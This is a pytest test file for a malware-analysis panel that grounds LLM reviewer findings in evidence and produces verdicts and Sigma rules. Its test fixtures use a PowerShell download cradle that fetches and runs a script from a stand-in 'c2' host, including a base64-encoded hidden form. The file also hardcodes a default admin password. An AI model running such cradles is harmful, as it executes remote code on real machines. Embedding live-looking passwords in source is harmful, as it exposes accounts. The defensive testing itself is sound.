"""Tests for the Mixture-of-Experts (MoE) Analyst Panel (Feb-2026).

Covers:
    * Evidence normalisation
    * Anti-hallucination guardrail (findings without evidence_refs dropped)
    * Deterministic fallback (no LLM key) produces evidence-grounded findings
    * Synthesiser correctly computes consensus + disagreements
    * Router endpoint schema + auth
"""
from __future__ import annotations
import os
import asyncio

import pytest
import requests

from reasoning.moe_panel import (
    normalise_evidence, _fallback_malware_analyst, _fallback_red_team,
    _fallback_defensive, _synthesise, _parse_finding_dict,
    _valid_evidence_refs, run_panel_async,
    Finding, EvidenceRef,
    _extract_json_object, ReviewerResponseSchema, _FindingIn,
)
from pydantic import ValidationError


BASE_URL = "http://localhost:8001"
ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@nivxray.com")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "uulVDp5cCSB3Hva99s7UUAwK")


@pytest.fixture(scope="module")
def auth_headers():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
                      timeout=30)
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


# ─── Evidence normalisation ──────────────────────────────────────────────
class TestNormaliseEvidence:
    def test_flat_iocs_list(self):
        ev = normalise_evidence({"iocs": ["http://x", "1.2.3.4"]})
        assert ev["iocs"] == ["http://x", "1.2.3.4"]

    def test_dict_iocs_flattened_and_deduped(self):
        ev = normalise_evidence({"iocs": {"url": ["http://x"], "ip": ["1.2.3.4"],
                                            "domain": ["evil.tld"]}})
        assert set(ev["iocs"]) == {"http://x", "1.2.3.4", "evil.tld"}

    def test_mitre_normalised_to_dicts(self):
        ev = normalise_evidence({"mitre": [
            {"id": "T1059.001", "technique": "PowerShell", "tactic": "Execution"},
            {"technique_id": "T1105", "name": "Ingress Tool Transfer"},
            "T1218",
        ]})
        ids = {m["id"] for m in ev["mitre"]}
        assert ids == {"T1059.001", "T1105", "T1218"}

    def test_chain_extracted_from_steps(self):
        ev = normalise_evidence({"steps": [{"op": "base64-decode"},
                                             {"op": "utf16le-decode"}]})
        assert ev["chain"] == ["base64-decode", "utf16le-decode"]

    def test_lolbins_extracted(self):
        ev = normalise_evidence({"lolbins": [
            {"name": "certutil.exe", "mitre": "T1140", "purpose": "decode"},
            "powershell.exe",
        ]})
        names = {l["name"] for l in ev["lolbins"]}
        assert names == {"certutil.exe", "powershell.exe"}


# ─── Anti-hallucination guardrail ────────────────────────────────────────
class TestAntiHallucinationGuardrail:
    def _ev(self):
        return normalise_evidence({
            "input": "powershell -enc AAAA",
            "decoded_output": "IEX (New-Object Net.WebClient).DownloadString('http://c2/a.ps1')",
            "steps": [{"op": "base64-decode"}, {"op": "utf16le-decode"}],
            "iocs": {"url": ["http://c2/a.ps1"]},
            "lolbins": [{"name": "powershell.exe"}],
            "mitre": [{"id": "T1059.001", "technique": "PowerShell"}],
        })

    def test_valid_ref_kept(self):
        ev = self._ev()
        refs = _valid_evidence_refs(
            [{"type": "chain", "value": "base64-decode"},
             {"type": "ioc", "value": "http://c2/a.ps1"},
             {"type": "mitre", "value": "T1059.001"}],
            ev,
        )
        assert len(refs) == 3

    def test_fake_ioc_dropped(self):
        ev = self._ev()
        refs = _valid_evidence_refs(
            [{"type": "ioc", "value": "http://never-mentioned.tld"}],
            ev,
        )
        assert refs == []

    def test_fake_mitre_dropped(self):
        ev = self._ev()
        refs = _valid_evidence_refs(
            [{"type": "mitre", "value": "T9999.999"}],
            ev,
        )
        assert refs == []

    def test_finding_without_evidence_ref_dropped(self):
        ev = self._ev()
        # Hallucinated finding — evidence_refs point at fake IOC → dropped
        f = _parse_finding_dict(
            {"title": "Fake finding",
             "description": "The payload uses something not in evidence.",
             "severity": "high",
             "confidence": 0.9,
             "evidence_refs": [{"type": "ioc", "value": "http://not-real.tld"}]},
            ev,
        )
        assert f is None

    def test_valid_finding_kept(self):
        ev = self._ev()
        f = _parse_finding_dict(
            {"title": "PowerShell -enc",
             "description": "Uses base64 to hide payload.",
             "severity": "high",
             "confidence": 0.85,
             "evidence_refs": [{"type": "chain", "value": "base64-decode"}]},
            ev,
        )
        assert f is not None
        assert f.severity == "high"
        assert f.evidence_refs[0].value == "base64-decode"


# ─── Deterministic fallback (no LLM) ─────────────────────────────────────
class TestFallbackReviewers:
    def _ev(self):
        return normalise_evidence({
            "input": "powershell -w hidden -enc AAAA",
            "decoded_output": "IEX (New-Object Net.WebClient).DownloadString('http://c2/a.ps1')",
            "steps": [{"op": "base64-decode"}, {"op": "utf16le-decode"}],
            "iocs": {"url": ["http://c2/a.ps1"]},
            "lolbins": [{"name": "powershell.exe", "mitre": "T1059"}],
            "mitre": [{"id": "T1059.001", "technique": "PowerShell",
                       "tactic": "Execution"}],
        })

    def test_malware_analyst_produces_findings(self):
        r = _fallback_malware_analyst(self._ev())
        assert r.reviewer == "malware_analyst"
        assert len(r.findings) >= 2
        # Every finding cites evidence
        for f in r.findings:
            assert len(f.evidence_refs) >= 1

    def test_red_team_flags_evasion(self):
        r = _fallback_red_team(self._ev())
        titles = " ".join(f.title.lower() for f in r.findings)
        assert "lolbin" in titles or "obfusc" in titles or "cradle" in titles
        assert "techniques" in r.extras

    def test_defensive_emits_sigma_and_hunting(self):
        r = _fallback_defensive(self._ev())
        assert isinstance(r.extras.get("sigma_rules"), list)
        assert isinstance(r.extras.get("hunting_queries"), list)
        assert len(r.extras["sigma_rules"]) >= 1

    def test_empty_evidence_returns_gracefully(self):
        r = _fallback_malware_analyst(normalise_evidence({}))
        # Never crash on empty; findings may be empty
        assert r.reviewer == "malware_analyst"
        assert isinstance(r.findings, list)


# ─── Synthesiser ─────────────────────────────────────────────────────────
class TestSynthesiser:
    def _ev(self):
        return normalise_evidence({
            "steps": [{"op": "base64-decode"}],
            "iocs": ["http://c2/a.ps1"],
            "lolbins": [{"name": "powershell.exe"}],
            "mitre": [{"id": "T1059.001", "technique": "PowerShell"}],
            "decoded_output": "IEX DownloadString",
            "input": "-enc AAAA",
        })

    def test_produces_consensus_and_verdict(self):
        ev = self._ev()
        m = _fallback_malware_analyst(ev)
        r = _fallback_red_team(ev)
        d = _fallback_defensive(ev)
        syn = _synthesise([m, r, d], ev)
        assert "verdict" in syn
        assert syn["verdict"]["label"] in ("malicious", "suspicious")
        assert 0.0 <= syn["verdict"]["confidence"] <= 1.0
        assert syn["n_findings_total"] > 0
        assert isinstance(syn["consensus"], list)
        assert isinstance(syn["disagreements"], list)
        assert isinstance(syn["recommended_actions"], list)
        assert syn["recommended_actions"]

    def test_benign_candidate_when_no_evidence(self):
        ev = normalise_evidence({})
        syn = _synthesise([
            _fallback_malware_analyst(ev),
            _fallback_red_team(ev),
            _fallback_defensive(ev),
        ], ev)
        assert syn["verdict"]["label"] in ("benign-candidate", "unknown")


# ─── End-to-end async panel ──────────────────────────────────────────────
class TestPanelAsync:
    def test_run_panel_static_mode(self):
        ev = normalise_evidence({
            "input": "powershell -enc AAAA",
            "decoded_output": "IEX DownloadString('http://c2/a.ps1')",
            "steps": [{"op": "base64-decode"}],
            "iocs": ["http://c2/a.ps1"],
            "lolbins": [{"name": "powershell.exe"}],
            "mitre": [{"id": "T1059.001"}],
        })
        os.environ["EMERGENT_LLM_KEY"] = ""  # force static
        out = asyncio.run(run_panel_async(ev, session_id="test"))
        assert out["provider"] == "static"
        assert set(out["reviewers"].keys()) == {
            "malware_analyst", "red_team", "defensive"}
        for name, r in out["reviewers"].items():
            assert r["reviewer"] == name
            assert "findings" in r
            for f in r["findings"]:
                assert f["evidence_refs"], (
                    f"reviewer {name} emitted finding without evidence: {f}"
                )
        assert out["synthesis"]["verdict"]["label"] in (
            "malicious", "suspicious", "benign-candidate", "unknown")


# ─── Router integration ──────────────────────────────────────────────────
class TestRouter:
    def test_status_endpoint(self, auth_headers):
        r = requests.get(f"{BASE_URL}/api/moe/status",
                         headers=auth_headers, timeout=15)
        assert r.status_code == 200
        j = r.json()
        assert j["available"] is True
        assert set(j["reviewers"]) == {
            "malware_analyst", "red_team", "defensive"}

    def test_analyze_with_evidence_bundle(self, auth_headers):
        payload = {
            "evidence": {
                "input": "-enc AAAA",
                "decoded_output": "IEX DownloadString('http://c2/a.ps1')",
                "steps": [{"op": "base64-decode"}],
                "iocs": ["http://c2/a.ps1"],
                "lolbins": [{"name": "powershell.exe"}],
                "mitre": [{"id": "T1059.001"}],
            },
        }
        r = requests.post(f"{BASE_URL}/api/moe/analyze",
                          headers=auth_headers, json=payload, timeout=90)
        assert r.status_code == 200, r.text
        j = r.json()
        assert "reviewers" in j and "synthesis" in j
        assert set(j["reviewers"].keys()) == {
            "malware_analyst", "red_team", "defensive"}
        # Every finding is evidence-grounded
        for name, rep in j["reviewers"].items():
            for f in rep["findings"]:
                assert f["evidence_refs"], (name, f)

    def test_analyze_with_raw_input_runs_decode(self, auth_headers):
        # Real PowerShell b64 → let the pipeline build evidence itself
        import base64
        cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/a.ps1")'
        b64 = base64.b64encode(cmd.encode("utf-16le")).decode()
        r = requests.post(
            f"{BASE_URL}/api/moe/analyze",
            headers=auth_headers,
            json={"input": f"powershell -nop -w hidden -enc {b64}"},
            timeout=120,
        )
        assert r.status_code == 200, r.text
        j = r.json()
        assert j["evidence"]["chain"], "expected non-empty decode chain"
        assert j["synthesis"]["verdict"]["label"] in (
            "malicious", "suspicious", "benign-candidate", "unknown")

    def test_analyze_400_without_body(self, auth_headers):
        r = requests.post(f"{BASE_URL}/api/moe/analyze",
                          headers=auth_headers, json={}, timeout=15)
        assert r.status_code == 400

    def test_analyze_requires_auth(self):
        r = requests.post(f"{BASE_URL}/api/moe/analyze",
                          json={"input": "x"}, timeout=15)
        assert r.status_code in (401, 403)



# ─── JSON extractor regression tests (the root cause of the field bug) ──
class TestJsonExtractor:
    """Feb 2026 — direct regression coverage for the Claude-JSON parse
    failures that occurred in production when the defensive reviewer cited
    Sigma / KQL bodies containing embedded triple back-ticks."""

    def test_plain_json_object_parses(self):
        s = '{"summary":"ok","findings":[]}'
        out = _extract_json_object(s)
        assert out is not None
        import json as _j
        assert _j.loads(out)["summary"] == "ok"

    def test_json_wrapped_in_json_fence(self):
        s = '```json\n{"summary":"fenced","findings":[]}\n```'
        out = _extract_json_object(s)
        assert out is not None
        import json as _j
        assert _j.loads(out)["summary"] == "fenced"

    def test_json_wrapped_in_plain_fence(self):
        s = '```\n{"summary":"plain","findings":[]}\n```'
        out = _extract_json_object(s)
        assert out is not None

    def test_nested_backticks_inside_string_value(self):
        """This is the ACTUAL failure mode observed in production.

        Claude wraps its whole reply in ```json ... ``` and inside a
        sigma_rules[].detection string it also emits ``` around a code
        snippet. The old lazy-regex extractor cut off at the first inner
        fence, producing truncated JSON.
        """
        s = (
            '```json\n'
            '{"summary":"nested","findings":[],'
            '"sigma_rules":[{"title":"x","detection":"```\\ndetection:\\n  ok\\n```"}]}\n'
            '```'
        )
        out = _extract_json_object(s)
        assert out is not None, "extractor must survive nested ``` inside string values"
        import json as _j
        parsed = _j.loads(out)
        assert parsed["summary"] == "nested"
        assert parsed["sigma_rules"][0]["title"] == "x"

    def test_leading_and_trailing_prose(self):
        s = 'Here is the analysis you requested:\n{"summary":"ok","findings":[]}\nHope this helps!'
        out = _extract_json_object(s)
        assert out is not None
        import json as _j
        assert _j.loads(out)["summary"] == "ok"

    def test_picks_largest_of_multiple_objects(self):
        # A tiny throwaway object followed by the real payload.
        s = '{"noise":1}\nActual: {"summary":"big","findings":[{"title":"t","description":"d","evidence_refs":[{"type":"chain","value":"x"}]}]}'
        out = _extract_json_object(s)
        import json as _j
        parsed = _j.loads(out)
        assert parsed["summary"] == "big"
        assert len(parsed["findings"]) == 1

    def test_returns_none_on_no_json(self):
        assert _extract_json_object("just prose, no braces here") is None
        assert _extract_json_object("") is None
        assert _extract_json_object(None) is None  # type: ignore

    def test_ignores_braces_inside_string_literals(self):
        # Curly braces inside a JSON string must not be treated as brackets.
        s = '{"summary":"has {curly} braces {inside}","findings":[]}'
        out = _extract_json_object(s)
        assert out is not None
        import json as _j
        assert _j.loads(out)["summary"] == "has {curly} braces {inside}"

    def test_handles_escaped_quotes(self):
        s = '{"summary":"quote \\"inside\\" me","findings":[]}'
        out = _extract_json_object(s)
        assert out is not None


# ─── Schema validation regression ────────────────────────────────────────
class TestSchemaValidation:
    def test_valid_reviewer_reply_parses(self):
        payload = {
            "summary": "test",
            "findings": [{
                "title": "Suspicious binary",
                "description": "certutil abused for download.",
                "severity": "high",
                "confidence": 0.9,
                "evidence_refs": [{"type": "lolbin", "value": "certutil.exe"}],
                "tags": ["lolbas"],
            }],
        }
        m = ReviewerResponseSchema.model_validate(payload)
        assert len(m.findings) == 1
        assert m.findings[0].severity == "high"

    def test_bad_severity_normalised(self):
        f = _FindingIn.model_validate({
            "title": "T", "description": "D",
            "severity": "APOCALYPTIC",
            "confidence": 0.5,
            "evidence_refs": [{"type": "chain", "value": "base64-decode"}],
        })
        assert f.severity == "medium"

    def test_confidence_clamped(self):
        f = _FindingIn.model_validate({
            "title": "T", "description": "D",
            "severity": "high",
            "confidence": 42,
            "evidence_refs": [{"type": "chain", "value": "base64-decode"}],
        })
        assert f.confidence == 1.0
        f2 = _FindingIn.model_validate({
            "title": "T", "description": "D",
            "severity": "high",
            "confidence": -5,
            "evidence_refs": [{"type": "chain", "value": "base64-decode"}],
        })
        assert f2.confidence == 0.0

    def test_bad_evidence_ref_type_rejected(self):
        with pytest.raises(ValidationError):
            _FindingIn.model_validate({
                "title": "T", "description": "D",
                "severity": "high",
                "confidence": 0.5,
                "evidence_refs": [{"type": "MADE_UP", "value": "x"}],
            })

    def test_finding_without_evidence_refs_rejected(self):
        with pytest.raises(ValidationError):
            _FindingIn.model_validate({
                "title": "T", "description": "D",
                "severity": "high",
                "confidence": 0.5,
                "evidence_refs": [],
            })

    def test_extras_survive_unknown_shape(self):
        payload = {
            "summary": "s",
            "findings": [],
            "sigma_rules": [{"title": "x", "detection": "y"}, "raw-string-rule"],
            "hunting_queries": ["q1"],
        }
        m = ReviewerResponseSchema.model_validate(payload)
        assert m.sigma_rules is not None
        assert m.hunting_queries == ["q1"]
